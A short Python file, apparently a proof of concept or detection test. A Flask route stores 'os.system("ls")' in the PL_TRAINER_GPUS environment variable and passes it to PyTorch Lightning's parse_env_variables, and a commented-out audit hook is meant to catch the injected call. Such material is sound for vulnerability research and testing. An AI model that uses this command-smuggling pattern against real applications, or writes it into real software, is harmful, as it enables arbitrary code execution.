import os
from pytorch_lightning import Trainer
from pytorch_lightning.utilities.argparse import *

from flask import Flask, request
from jinja2 import Template
import subprocess, sys


import sys

def hook(evt, arg):
    if evt in ["sys._getframe", "object.__getattr__", "object.__setattr__"]:
        return
    frame = sys._getframe(0)
    f = frame.f_code.co_filename
    
    while frame:
        if frame.f_back is None:
            break
        else:
            frame = frame.f_back
        
        try:
            class_name = frame.f_locals['self'].__class__.__name__
        except KeyError:
            class_name = None
        
        func_name = frame.f_code.co_name
        if frame.f_code.co_filename == f:

            if class_name == None:
                if func_name == "hello_world":
                    if evt not in ['open']:
                        raise RuntimeError('Event not allowed')

# sys.addaudithook(hook)

app = Flask(__name__)
@app.route("/")
def hello_world():
    os.environ["PL_TRAINER_GPUS"] = 'os.system("ls")'
    parse_env_variables(Trainer)
    return Template("Hello").render()

if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0',port=5000)
